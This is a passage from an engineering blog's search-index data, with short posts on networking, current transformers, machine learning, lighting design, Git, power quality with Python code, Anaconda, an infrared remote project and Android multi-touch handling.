'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"Engineering","url":"https://jackmckew.dev/introduction-to-esp32-esp8266.html","loc":"https://jackmckew.dev/introduction-to-esp32-esp8266.html"},{"title":"Episode 17 â€“ Networking Routing & Addressing","text":"Following last weeks post around network topologies, I believe the next topic to cover is routing and addressing. Routing is the process of selecting a path for traffic to flow through in a network while addressing is marking elements within a network. A real-world example of routing and addressing is the postal system, each element (person) is marked with an address (eg, a street address) and the mail makes it to that address from routing it from the sender to the receiver. While the goal for routing may be simple (\"go from sender to receiver in the most efficient/quickest way possible\"), the techniques used to achieve this can be very complex and confusing but when solutions are found that make a network work efficiently, it is a very rewarding experience for all users. Routing can be broken into three broad categories: Protocols â€“ the medium that allows information to move through a network Algorithms â€“ to determine paths between sender and receiver Databases â€“ to store information that the algorithms determine The whole premise around routers in a network ( Networking Basics ) is that they will \"pass it on\", either to their smarter peers or in the correct direction. For example in a star/tree network, devices pass information to their closest â€˜router' which then decides either to pass it directly to the correct address or to another router which may have a better idea on where the information is intended on going. Protocols In industry, some of the most common networking protocols are MODBUS and DNP3. Modbus being a de-facto standard for interconnecting electrical equipment and DNP3 (Distributed Network Protocol) commonly being used in the water/electric industries for their flexibility during outages or broken links in a network. Algorithms Routing tables is the most prevalent type of routing algorithms with their fixed nature meaning once the routing decisions for how information travels have been decided, they do not change. The other type of routing algorithms (which are much more exciting) are known as adaptive algorithms, which means the routing changes depending on: topology, delay, load, etc, to try and reach the most efficient path from sender to receiver. Databases Following algorithms, databases can either hold the entire routing table and a router looks up where it wants to go and it which path to take (similar to a bus timetable), or, forwarding tables (technically can be apart of routing tables as well) which detail the communications pathways to utilize for types of traffic.","tags":"Engineering","url":"https://jackmckew.dev/episode-17-networking-routing-addressing.html","loc":"https://jackmckew.dev/episode-17-networking-routing-addressing.html"},{"title":"Episode 16 - Networking Basics","text":"A network is defined as \"A network is a collection of computers, servers, mainframes, network devices, peripherals, or other devices connected to one another to allow the sharing of data\". There are various configurations of networks for specific design scenarios as represented in: Typical residential home networks are configured in a tree topology that is connected to the internet. This typically consists of a single router/modem that serves all the end-user devices on the network with internet connection. The router also acts as a gateway for the devices connected on the network to communicate with one another. Packets of data that are generated by the devices are encapsulated with destination routing information; which is passed to the router at the center which directs the data to it's destination in the network. For example, a user connects to the router to gain access to a wider network that is the internet to load this webpage. If there was a higher risk on losing the communications medium between two devices (cable failure), then bus would be at disadvantage here but ring might prove more beneficial although transmission would be slower as the network connection would be further away (go around the ring in the case of the picture above). Mesh Topology By explaining network topologies by comparing to a basic Wi-Fi network normally gets the message across. A mesh network can prove beneficial to areas in which a star network isn't covering the area you wish it to, for example, if you have 'dark' spots where you don't receive Wi-Fi signal, a mesh network might be better suited. A practical implementation of a mesh network can be seen in shopping centre's Wi-Fi networks where multiple routers are placed strategically such that you can walk around the entire property and not lose signal. Ring Topology While star is a very popular configuration of network, it however is not the most ideal configuration for some types of networks. For example, if you had a series of devices that all needed to talk to each other, even if one was to fail, then a ring/bus/mesh would be more applicable where there is always a path to everyone else if a device was to fall offline. Star Topology If you consider a home Wi-Fi network that doesn't connect out further (no internet connection) then you have a basic star network. The center of the star in this scenario would be the Wi-Fi router, you can still connect to the other devices but not outside of your network and all messages have to travel through the router. Tree Topology A tree topology is just creating multiple star networks off the back of another network. For example, if you considered the network that is your internet connection from the street (or satellite), then connecting to your modem (gateway) then furthering to your devices in your home, you have a basic tree network. Bus Topology Where devices are connected to a single medium (cable) to communicate with each other, you now have a bus network. A bus network proves it's advantages by less cabling than star networks, ease of installation of linear networks and works well with small networks. It is easy enough to add new devices to the network and if one fails (but the medium doesn't) then all devices can still communicate. Disadvantages arise when problems occur as it difficult to determine the cause of an issue on a bus network.","tags":"Engineering","url":"https://jackmckew.dev/episode-16-networking-basics.html","loc":"https://jackmckew.dev/episode-16-networking-basics.html"},{"title":"Episode 15 - What is a C.T?","text":"A C.T is the abbreviated form for a current transformer in electrical terms. It is a simple but effective use of magnetic circuits and transformer characteristics to monitor how power is behaving in a conductor. The C.T works by wrapping a coil of conductor around a core (typically silicon steel) shaped like a ring, the 'power' wire or the active is then passed through the core. When alternating current passes through the active conductor, this then generates a magnetic field around the wire, inducing a current proportional to the number of turns the wire is wrapped around the core. The C.T is a very widely used piece of equipment in instrument electrical/electronics as it allows for an indirect way of monitoring for the power flow unlike a 'flow' meter that must be a part of the pipework to directly measure flow. While it is still possible to monitor current in a 'flow' meter type fashion, it is far less risk to implement a C.T solution. Possibly the frequent implementation of C.Ts in everyday life is within power meter solutions. By attaching a C.T to the active conductor that is powering a piece of equipment, we are then able to measure the power the equipment is using in real time. This can then be further digitised and utilised in a network fashion to provide asset owners with real time energy usage of their equipment. It must be noted when using C.Ts on alternating current systems that the C.T must only have a single conductor pass through it (the active); if both the active and the neutral are passed through the C.T then (in an ideal world) the C.T will have an output of 0. If you also pass through the earth wire to the equipment, it is possible to measure earth leakage or earth fault current (provided the measurement can handle it).","tags":"Engineering","url":"https://jackmckew.dev/episode-15-what-is-a-c-t.html","loc":"https://jackmckew.dev/episode-15-what-is-a-c-t.html"},{"title":"Episode 14 - Types of Machine Learning","text":"With AI and Machine Learning becoming the buzzwords in technology for 2018 and the real world applications now maturing to show the benefits of this technology. It can be very confusing when first entering the world of AI and machine learning with new techniques coming out every other day in search of improving the technology. Hopefully this article will help break down the barriers of the jargon and explain the types of machine learning algorithms out in the wild simplistically. In general, there are 3 different broad categories that current machine learning algorithms fit into: Supervised learning Unsupervised learning Reinforcement learning Supervised Learning Most practical machine learning algorithms use supervised learning. Supervised learning is where you have one or more input variables (x) and output variable(s) (y), and you use an algorithm to learn the mapping function from the input to the output. 1 y = f(x) The end goal of this algorithm is to approximate the mapping function accurately such that then you have a new data input (x), you can predict what the result (y) for that data would be. The name supervised learning comes from the algorithm first learning from a training data set before we present the algorithm to a new data set. The training data set can be thought as the teacher who is supervising the learning process, and learning only stops when the algorithm reaches an acceptable level of performance on predicting the result. Unsupervised Learning Unsupervised learning is when you only have the input variable(s) (x) and no respective output (y). The end goal for unsupervised learning is to model the distribution or structure of the data in order to discover and learn about the data set. Unsupervised learning in contrast to supervised learning is where the omnipresent teacher in supervised learning is gone and there is no correct answers. The algorithm is left alone to discover and present the distribution/structure in the data that it determines. Reinforcement Learning Reinforcement learning is the third broad category that a machine learning algorithm can fall into, where the algorithm has the input variable(s) (x) and through interacting with the input data set receives rewards for performing favoured actions. Learning from interactions with the environment around us comes from our natural experiences in the world. For example, imagine you're a child in a room with a fire. You move closer to the fire and feel it's warmth and it makes you feel good, this is a positive reward; then you try a touch the fire and it burns you hand, this is a negative reward. Reinforcement learning is just a computational approach to learning from interactions to achieve the most favourable result, in our example, we learnt that being close to the fire is a positive thing but too close is a negative thing so our result is to maintain a sufficient distance away to be warm but no burnt.","tags":"Machine Learning","url":"https://jackmckew.dev/episode-13-types-of-machine-learning.html","loc":"https://jackmckew.dev/episode-13-types-of-machine-learning.html"},{"title":"Episode 13 - Lighting Design","text":"Before I started in a more buildings-focused electrical engineering position, I didn't think that much went into selecting lights for buildings. Once you first get started in lighting design, it is like opening a can of worms, there is so much detail that goes into lighting design, it's unfathomable. First of all, lighting design in Australia is dictated by AS1158. Not only does the Australian standard explicitly state illuminance requirements for rooms based on their task (eg 320 lux for office based tasks), it also clearly defines how to calculate these levels based on the environment. What really is lux? Lux is the SI derived unit of illuminance and luminous emittance, measuring luminous flux per unit area. It is equal to one lumen per square meter. Luminous flux? Lumens? What do all these terms mean? A lumen is the SI derived unit of luminous flux, which is a measure of the total amount of visible light emitted by a source. Now when it comes to designing lighting for a building/area, multiple large considerations must be taken. Once you have determined what tasks will be completed within the area you are designing, you must then go to AS1158 and determine the required lux requirements. Following this, you must ensure you have accurate dimensions of the area you are designing for, along with all reflectance (colour) of surfaces within the area. Once you have got all these parameters, it is time to begin modelling the area within any lighting design software package (eg AGI-32). Now the designer must select lights (luminaires) to be specified for the area. The designer must take into consideration the ceiling (if there is one) type, this will dictate how the luminaires are to be mounted, be it: surface, recessed, suspended or pole mounted. Most luminaire fitting manufacturers will provide photometric files (IES files) detailing how their respective lights would behave if they were installed in the design area. Once the designer has verified that the specified luminaires will meet required lux levels in the area, this design must be passed to the electrical designer as they must factor in how much power all the luminaires will require to operate and how the cable routes must be laid out to suit the luminaires on the site. Please note, that this is a very simplistic view at lighting design. Just like any area of work, there is an art to doing a proper job.","tags":"Engineering","url":"https://jackmckew.dev/episode-13-lighting-design.html","loc":"https://jackmckew.dev/episode-13-lighting-design.html"},{"title":"Episode 12 - What is Git?","text":"One of the biggest issues when working on any project regardless of what industry, discipline or context, as soon as a new 'version' of design or update comes along, the issue of version control appears. When this change(s) come along in the life cycle of a project, it is within everyone involved's best interests to maintain some type of version control, to manage and track changes between versions. When it comes to software development version control, the most well-known and commonly used system is Git. Git is a actively maintained open source project originally developed by Linus Torvalds (creator of the Linux OS kernel) in 2005. Multitudes of software projects depend on git for version control, including both commercial and open source. Git has a distributed architecture, meaning rather than having one single location for the full version history of the project, every developer's working copy of the project is also a location that can contain the full history. This also comes with the benefit that if one developer happens to lose the entire project, it can be restored from other developers (pending they have/are working on the latest version). Flexibility Git is flexible in several respects: efficiency at maintaining version control for both small and large projects, capable at handling numerous types of non-linear development workflows and compatibility with existing protocols and systems. Git supports branching and tagging (unlike other commonly used version control systems), and operations that affect branches and tags such as reverting or merging are stored as part of the change history. This level of tracking is not available in many other version control systems. Security The integrity of the source code of the project was identified as a top priority when Git was design. Cryptographically secure hashing algorithms are used to secure: file contents, file and directory relationships, versions, tags and commits. This defends the project's source files and change history against both malicious and accidental changes and ensures that all modifications is fully traceable. Use-case Bob wants to implement a new feature to the project he is working on in anticipation of the upcoming 3.0 release, and commits the new feature with descriptive messages. After being inspired by the new feature, he works on a second new feature and commits those modifications as well. Naturally, these two new features are logged as separate entities within the change history of the project. Bob then returns back to version 2.6 of the same project to fix a problem that only affects version 2.6. This allow Bob (and his team) to distribute that fix release (version 2.6.1), before version 3.0 is ready. Bob can then return to the upcoming version 3.0 'branch' to continue implementing new features. Since Bob has his own copy of the entire project, all of these changes can occur without an network access, thus being reliable and fast. To submit all these committed features and fixes to the remote copy of the project, it simply done by the use of the 'push' command.","tags":"Software Development","url":"https://jackmckew.dev/episode-12-what-is-git.html","loc":"https://jackmckew.dev/episode-12-what-is-git.html"},{"title":"Episode 11 - Power Quality Explained","text":"I've always lived by the rule that if you can't explain something to a 5 year old then you don't know it well enough. I was asked recently by some (non-electrical focused) colleagues on a handful of electrical terms and components. One of the biggest things that kept popping up that I found difficult to explain clearly was power quality and it's issues. So I decided why not dedicate a blog post about it and write a basic example power factor capacitor calculator in Python. Power quality is defined as \"the concept of powering and grounding sensitive electronic equipment in a manner suitable for the equipment with precise wiring system and other connected equipment\" by the IEEE (The Institute of Electrical and Electronics Engineers). In a simplistic view this is just trying to say that electrical equipment is to be installed/configured in a way that is operates as intended. Quality of power is not determined by the one who produces it, it's defined by the end user of the power. Eg, like a physical product, if you buy something from a store and it's poor quality, that's being defined by the end user. Similar to that of a physical product, quality of power can be lost in a variety of forms/ways. Issues with power quality can be categorized into three main categories: Harmonic voltages and currents Poor power factor Voltage instability Harmonics AC (Alternating Current) electricity is generated as a sinusoidal waveform, and harmonics are signals/waves whose frequency is a whole number multiple of the frequency of the reference signal/wave. To visualize this phenomenon, we can use packages like NumPy and Matplotlib, to calculate and plot our base signal and it's harmonics (I encourage you to run this code and change the harmonics to see what they look like). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import numpy as np import matplotlib.pyplot as plt def Harmonic ( i ): x = np . linspace ( 0 , 2 * np . pi , 2000 ) y = [ 0 for _ in x ] for n in range ( 0 , i ): y += np . sin (( 2 * n + 1 ) * ( 2 * np . pi ) * ( x )) / ( 2 * n + 1 ) plt . plot ( x , y ) plt . grid () Harmonic ( 1 ) Harmonic ( 2 ) # Harmonic(3) # Harmonic(4) # Harmonic(5) plt . show () The example above shows us the base signal (fundamental frequency), and it's first harmonic (harmonic of 2 or twice as fast as the fundamental frequency). When these two signals are superimposed on each other, they produce a distorted waveform. Electrical equipment is designed to operate at the base signal (50Hz here in Australia), and typically does not cope with distorted wave like seen below when we superimpose a base signal with it's first harmonic. Luckily, these issues are now easily detected and rectified by harmonic analyzers and active/passive harmonic filters. Power Factor Power factor is a measure of how effectively power is being used in an electrical system, and is defined as the ratio of real (useful) to apparent (total) power. Real power (kW) is the power that actually powers the equipment to produce useful work (such as spinning a motor). It can also be called actual, active or working power. Reactive power (kVAR) is the power required by (some) equipment (eg, motors), to produce a magnetic field to enable the useful work to be produce. It's necessary to operate the equipment, however you don't see any result from the reactive power. Apparent power (kVA) is the vector sum of the real power (kW) and reactive power (kVAR) and is the total power supplied from the mains power required to produce the right amount of real power. Suppose you are running a store, you have to spend an amount of money X (cost) on buying products to sell in the future for a larger amount of money Y, meaning your profit will be P = Y - X. X is not lost money, without spending X you will not be able to make any profit P. The profit P is comparable to the active power, the earnings Y are the equivalent of apparent power and the initial cost X is the reactive power. Therefore, for a given power supply (kVA): The more cost you have (higher percentage of kVAR), the lower the ratio of kW (profit) to kVA (profit + cost), meaning a poorer power factor. The less cost you have (lower percentage of kVAR), the higher your ratio of kW (profit) to kVA (profit + cost) becomes, and the better you power factor. As your cost (kVAR) approaches zero, your power factor approaches 1 (unity). Voltage Instability A stable voltage is when every piece of equipment connected to a network is operating under normal condition without issues, however when a fault or disturbance (harmonics) occurs in this system, the voltage becomes unstable. Due to voltage instability, the electrical system's voltage may collapse, if the voltage is below acceptable limits. Voltage collapse may be a total or partial black, the terms voltage instability and voltage collapse are interchangeable. For example, if 10 generators are running to keep 10 machines working. Suddenly 3 of the generators run out of fuel, but the 10 machines keep going. This would cause a loss of generation, not being able to maintain the power required to keep all the machines working and consequentially since there is not enough power to share between any of the machines, all 10 machines will turn off, causing a total blackout. Capacitor Calculator - Python Correcting power factor from a lagging (\\<1) power factor, can be as simple as reducing reactive power (kVAR) in the system such that the ratio of real power (kW) to apparent power (kVA) is still as close to unity (1) as possible. Since motors require inductive or lagging power for magnetizing before useful work beings, this brings makes the power factor of the system lagging (\\<1). Capacitors provide capacitive or leading reactive power that cancels out the lagging power when used for power-factor improvement. The improved power factor changes the current requirements of the system, but not the one required by the motor. Using these formulas we can calculate just how big of a capacitor we require: Once we input all these required formulas, and our initial data points, we are now able to easily compute the required size of capacitor to amend power factor issues. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from math import sqrt , pi real_power = 2.2 #Real power in kW current = 10 #Current in amps voltage = 240 #Voltage in volts frequency = 50 #Frequency in hertz corrected_pf = 0.95 #Target power factor #Calculate current power factor and apparent power current_pf = 1000 * real_power / ( voltage * current ) S_current = ( voltage * current ) / 1000 #Power factors greater than 1 will give imaginary Q_current, alert user try : #Calculate current reactive power Q_current = sqrt ( pow ( abs ( S_current ), 2 ) - pow ( real_power , 2 )) #Calculate target apparent power S_corrected = real_power / corrected_pf #Calculate required reactive power compensation Q_corrected = sqrt ( pow ( S_corrected , 2 ) - pow ( real_power , 2 )) #Calculate size of capacitor required for reactive power Q_c = Q_current - Q_corrected C_f = 1000 * Q_c / ( 2 * pi * frequency * voltage ) #Print results to user print ( \"Current power factor {0:.3f} \" . format ( current_pf )) print ( \"Current apparent power {0:.3f} kVA\" . format ( S_current )) print ( \"Current reactive power {0:.3f} kVAR\" . format ( Q_current )) print ( \"Capacitor required {0:.3f} Farads\" . format ( C_f )) except ValueError : print ( \"Current power factor > 1\" )","tags":"Engineering","url":"https://jackmckew.dev/episode-11-power-quality-explained.html","loc":"https://jackmckew.dev/episode-11-power-quality-explained.html"},{"title":"Episode 10 - Python Package Cheat Sheet","text":"One of the biggest skills in any career path comes solely from knowing where to look and what to look for when breaking down a problem. The same principle applies for Python programming. Since there are millions of different packages out there that all serve different purposes, it is often difficult to even know if there is a package out there that will solve your problem. I will be updating this table in the future as well as I personally find more and more solutions to my problems, and hope to share this insight with everyone. I will not be including packages from Python's standard library. Package Name Description Used For Pandas pandas is an open source, BSD-licensed library providing high-performance, easy-to-use data structures and data analysis tools for the Python programming language. Data Analysis Numpy NumPy is the fundamental package for scientific computing with Python. Data Analysis SciPy SciPy (pronounced \"Sigh Pie\") is a Python-based ecosystem of open-source software for mathematics, science, and engineering. Data Analysis Matplotlib Matplotlib is a Python 2D plotting library which produces publication quality figures in a variety of hardcopy formats and interactive environments across platforms. Data Visualisation Spyder Spyder is a powerful scientific environment written in Python, for Python, and designed by and for scientists, engineers and data analysts. Data Visualisation/Data Analysis Folium folium builds on the data wrangling strengths of the Python ecosystem and the mapping strengths of the Leaflet.js library. Manipulate your data in Python, then visualize it in a Leaflet map via folium. Data Visualiation Bokeh Bokeh is an interactive visualization library that targets modern web browsers for presentation. Data Visualisation Camelot Camelot is a Python library that makes it easy for anyone to extract tables from PDF files! PDF Manipulation tqdm tqdm is a lightweight package for displaying progress bars within a console General Selenium Selenium automates browsers . That's it! What you do with that power is entirely up to you. Web Automation Beautiful Soup Beautiful Soup is a Python library for pulling data out of HTML and XML files. Web Scraping Scrapy An open source and collaborative framework for extracting the data you need from websites. In a fast, simple, yet extensible way. Web Scraping Requests Requests is an elegant and simple HTTP library for Python, built for human beings. Web Interaction Flask Flask is a microframework for Python based on Werkzeug, Jinja 2 and good intentions. And before you ask: It's BSD licensed ! Web Development Django Django is a high-level Python Web framework that encourages rapid development and clean, pragmatic design. Web Development Opencv OpenCV (Open Source Computer Vision Library) is released under a BSD license and hence it's free for both academic and commercial use. Image Analysis Pygame pygame ( the library ) is a Free and Open Source python programming language library for making multimedia applications like games built on top of the excellent SDL library. Game Development Pyinstaller PyInstaller freezes (packages) Python applications into stand-alone executables, under Windows, GNU/Linux, Mac OS X, FreeBSD, Solaris and AIX. Distribution cx_freeze cx_Freeze is a set of scripts and modules for freezing Python scripts into executables Distribution PyQt5 Qt is set of cross-platform C++ libraries that implement high-level APIs for accessing many aspects of modern desktop and mobile systems. GUI Development","tags":"Python","url":"https://jackmckew.dev/episode-10-python-package-cheat-sheet.html","loc":"https://jackmckew.dev/episode-10-python-package-cheat-sheet.html"},{"title":"Episode 9 - Web Enabled Universal Remote - Part 1","text":"I have a habit of misplacing all kinds of remotes within the house, TV, air conditioner, fans, etc, and having a different remote for everything can be quite annoying at times. So I decided to re-use some leftover components from a previous project to make a web enabled universal remote. Since most existing remotes use infrared to send the signal from the remote to the device, I figured it would be simple enough to create a infrared signal 'decoder' and then use a infrared diode to then replicate this signal back to the device. Next consideration was what do hardware is needed to get this project up and running. After researching a few other DIY remote control guides on the internet, I came up with a plan to use a wifi-enabled microcontroller together with an infrared receiver and an infrared diode. After rummaging through my spare hardware box, I happened to find a spare NodeMCU (ESP8266) that I could use for this project, this brings my part list to: Wifi-Enabled Microcontroller (NodeMCU) A resistor to dampen the diode signal (100 ohm) A transistor to boost the current from the NodeMCU so the diode signal gets to the device (2N222) Infrared receiver (TSOP4136) Infrared diode (L-7113F3BT) Now before connecting the entire circuit together, one should always test that components work in an expected way. To achieve this for the infrared receiver, a basic program to interface between the receiver and the microcontroller is needed. For a basic test, an LED would light up whenever the infrared is receiving a signal. By following the circuit diagram with the corresponding code for the NodeMCU, this test for the receiver should be reproduce-able at home, please note that for other infrared receivers you will need to check the pin outs. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #define ledPin D0 //Connection at GPIO16 (D0) for the builtin LED on the NodeMCU board #define inputPin D5 //Connection at GPIO14 (D5) for the infrared receiver int val = 0 ; // variable for reading the pin status void setup () { pinMode ( ledPin , OUTPUT ); // declare LED as output pinMode ( inputPin , INPUT ); // declare Infrared sensor as input } void loop () { val = digitalRead ( inputPin ); // read input value if ( val == HIGH ) { // check if the input is HIGH digitalWrite ( ledPin , LOW ); // turn LED OFF } else { digitalWrite ( ledPin , HIGH ); // turn LED ON } } In the code above, this defines the pins that the sensor and LED are connected to, checks if the sensor is receiving a signal and then switches the builtin LED accordingly. Since the microcontroller loops without delay and an infrared remote control sends signals very quickly with delay in between, the LED only flickers when a remote is aimed at it, however proving the component works as expected. Now that we have confirmed the receiver works as expected, we have to integrate and interface the infrared diode with the microcontroller such that we are able to send the decoded signals back at the device. Since the NodeMCU can only pass a maximum current of 12mA through the GPIO pins, this will not be enough for the infrared diode peak spectrum which occurs at 20mA. To boost the current up from 12mA to 20mA+, it is best to use a simple transistor, for this project I had some 2N2222 transistors lying around so decided to use them. The following circuit diagram shows how the infrared diode, transistor and microcontroller integrate together. Since the human eye cannot see the infrared diode turning on/off, this creates a challenge for testing this component before implementing the project. I did not create a test specifically for the diode, and will test whether it works correctly later on in some function testing of the project. This completes the hardware component of this project, the next part of this project will be the software. I am planning to utilise both docker and django on my home Raspberry Pi to act as a webserver that will issue commands to the microcontroller over a network to mimic the device's remote control.","tags":"Engineering","url":"https://jackmckew.dev/episode-9-web-enabled-universal-remote-part-1.html","loc":"https://jackmckew.dev/episode-9-web-enabled-universal-remote-part-1.html"},{"title":"Episode 8 - Anaconda","text":"Python is one of my favourite languages to develop in (if you haven't noticed yet). My favourite feature of Python is how easy it is to share your work with others and integrate other's code into your own projects. However as a project grows and gets older as time goes on it can be cumbersome to keep track of hundreds of dependencies that your project relies on to work. Even more so when all of these package dependencies are also being updated and changing functionality. One elegant solution that I always use when first starting a new project is to use Anaconda ( https://www.anaconda.com/). Anaconda is a free, easy-to-install package and environment manager for Python. It is very simple to use in that when you are starting a new project, you just need to create a new environment (within the Anaconda navigator) with the python version you wish to use and then activate it. Simple as that. 1 conda create --name new_environment_name python = 3 .5 In one single line, we have just created a new environment named \"new_environment_name\" and specified that this environment will use Python version 3.5. Now to activate the environment it is as simple as typing \"activate new_environment_name\". 1 activate new_environment_name Now to see what packages are contained within our newly created environment, or to ever see what packages and their versions are listed the command is: 1 conda list Now that we have created, activated and peeked inside our newly created environment we need to add some packages that we might use! This is as simple as the command \"conda install PACKAGENAME\", for example we might want to install matplotlib, a widely used data visualization package. Installing matplotlib into our environment is done by the command: 1 conda install matplotlib You will note that when this runs, it also asks to install all the dependencies that matplotlib relies on and will also notify you later when you have more packages that some might clash and need to be upgraded/downgraded so that all packages have a common version to work with. With regards to working with certain version numbers of packages within an Anaconda environment, to install a specific version of a package, or even if you know what the minimum requirement is, can by following the table below: Constraint Specification Result Fuzzy numpy=1.11 1.11.0, 1.11.1, 1.11.2, 1.11.18, etc Exact numpy==1.11 1.11.0 Greater than or equal to \"numpy>=1.11\" 1.11.0 or higher OR \"numpy=1.11.1|1.11.3\" 1.11.1 or 1.11.3 AND \"numpy>1.8,<2\" 1.8, 1.9, not 2.0 By following these simple constraint rules, it is very easy to manage package version to maintain dependencies within your project without tearing your hair out when packages update and break your project. Another major benefit of using Anaconda to manage your project's package dependencies is that when you're developing simultaneously with other projects and you may discover some bugs and wish to share them with your colleagues. To share all the dependencies (and their respective versions) with your colleague is as easy as generating an \"environment file\" and sharing the file with them so they have exactly the same environment as you. This is done by the following command: 1 conda env export > environment.yml Similarly, if you colleague sends you their \"environment file\", the command to reproduce their environment is (Please note that the name of the environment is encoded within the first line of the .yml file): 1 conda env create -f environment.yml In summary, Anaconda can be used to easily manage packages and dependencies across a project and fast track test/bug reproduction across multiple machines seamlessly. Personally, I would always advise to use a package manager across projects no matter the size.","tags":"Python","url":"https://jackmckew.dev/episode-8-anaconda.html","loc":"https://jackmckew.dev/episode-8-anaconda.html"},{"title":"Episode 7 â€“ Planning","text":"With 2018 coming to an end, we welcome in the new year with the first episode of Code Fridays for 2018. Continuing with the theme of things starting a new, this episode is dedicated to a major factor or stage in any type of development, planning. Planning is one of the most crucial steps when beginning to tackle a project or even a problem. One of the most effective ways to deal with a problem coming from a time or financial perspective is prevention of the problem. By considering what problems may arise in a project's lifetime, the developer or designer can implement prevention before the problem comes to fruition. Being an effective planner can help you in all walks of life. Not only can one just plan for problems that may arise in a project, one can also plan to educate themselves with the knowledge to tackle unforeseen problems within a project. With an entire new year ahead of us all, I'd like to plan on what I'd like to learn in 2019 and in turn share what I learn with you all through this blog. Containerization â€“ integrating containerization as mentioned in Episode 6 into projects Javascript â€“ javascript is still an enigma to me at this point, I plan to work on beginner projects and hopefully integrate some of them to enhance this website Developing, deploying and maintaining an Android Application â€“ I am currently midway through developing an Android application, in future episodes I will write tutorials on how to develop certain elements with an Android application to make it more interactive Big Data tools â€“ Apache arrow and Hadoop are also new to me at this point, hoping to integrate these elements into projects that I'm currently working on This is only just a small taste of what I am planning to cover at the very least on my weekly updates in this blog so stay tuned throughout the whole year!","tags":"Principles","url":"https://jackmckew.dev/episode-7-planning.html","loc":"https://jackmckew.dev/episode-7-planning.html"},{"title":"Episode 6 - Containerization","text":"Recently I was researching into ways to more efficiently and effectively distribute software and I stumbled across containerization of applications. Containerization of application is when an application is run on an OS-level virtualization without spinning up an entire virtual machine for the application. Previously the way I had been distributing software I had been developing in my preferred language (Python) was by using PyInstaller ( https://pyinstaller.readthedocs.io/en/stable/). However I was running into issues with distributing a single executable throughout users, although since the software was only used by a small userbase at this stage, I was able to continue to use PyInstaller. I started researching containerization as in the future the software I will be developing will be used by a larger userbase. This will hopefully be more effective at managing versions and distributing updates to said userbase. Most other professionals in the software space have been constantly mentioning the use of Docker ( https://www.docker.com/), I am now integrating my projects into Docker and have had no issues thus far. By utilizing OS-level containerization this also allows the developer to run on any OS they wish. For multiple projects of mine, I had been intending to use influxDB ( https://www.influxdata.com/), however was limited to a strictly Windows only network. I see Docker as a solution to this problem, by being able to create a linux based container to run an instance of an influxDB that can be spun up within a Windows environment and communicate back to the Windows users in the network. Lastly, I'd like to wish a happy holidays to everyone reading and will be bringing more weekly content in the new year. Please do not hesitate to comment below if there is any topics/projects that you would like for me to research and write about my findings.","tags":"Software Development","url":"https://jackmckew.dev/episode-6-containerization.html","loc":"https://jackmckew.dev/episode-6-containerization.html"},{"title":"Episode 5 - Android Multi-Touch","text":"This week's episode of Code Fridays will go into detail on how to handle multi-touch inputs within Android. Firstly to handle the location on where the screen in being touched we need to create a class to handle the interaction. By creating a public class like Finger.java as can be seen below it contains 3 values: x_pos, y_pos and id. It is also useful to create a constructor so that other classes can easily construct the Finger class. 1 2 3 4 5 6 7 8 9 10 11 12 13 public class Finger { public float x_pos ; public float y_pos ; public int id ; Finger ( float init_x , float init_y , int init_id ) { x_pos = init_x ; y_pos = init_y ; id = init_id ; } } Now that we have a class to store our details on how each finger is touching the screen, we now need to interact with some base level Java. Firstly we need to extend a view within the Android application so that the application knows what boundaries to deal, in my test application, I've just used the entire screen as a view. After that an array is needed to store the data of multiple inputs touching the screen. I've used a TreeMap in this example as this allows for ease later on so that they are in order on how they were input, however this comes with a downside to this example as lifting a input in the middle of the order touched crashes the array, this will be fixed in a later episode. A paint is initialized for both the stroke paint for drawing lines between the touches and a paint for the text that is to come. Generic constructors for the view are also listed below. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public class TouchView extends View { private TreeMap < Integer , Finger > lineMap = new TreeMap <> (); @SuppressLint ( \"UseSparseArrays\" ) private HashMap < Integer , Path > fingerMap = new HashMap <> (); private Paint myPaint ; private Paint textPaint ; public TouchView ( Context context ) { super ( context ); init (); } public TouchView ( Context context , AttributeSet attrs , int defStyle ) { super ( context , attrs , defStyle ); init (); } public TouchView ( Context context , AttributeSet attrs ) { super ( context , attrs ); init (); } private void init () { myPaint = new Paint (); myPaint . setStyle ( Paint . Style . FILL_AND_STROKE ); myPaint . setStrokeWidth ( 5 ); myPaint . setColor ( Color . RED ); textPaint = new Paint (); textPaint . setTextSize ( 50 ); } Now that everything is initialized and ready to draw some graphics on the screen so that the application is interactive, now we have to interface with touch events. This is done by creating a new function within our View class, that takes in a MotionEvent on the View so that we can detect different types of touch events. Documentation on this can be found ( https://developer.android.com/training/graphics/opengl/touch#java ). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 @SuppressLint ( \"ClickableViewAccessibility\" ) @Override public boolean onTouchEvent ( MotionEvent event ) { int action = event . getAction () & MotionEvent . ACTION_MASK ; switch ( action ) { case MotionEvent . ACTION_DOWN : { int id = event . getPointerId ( 0 ); fingerMap . put ( id , createCirPath 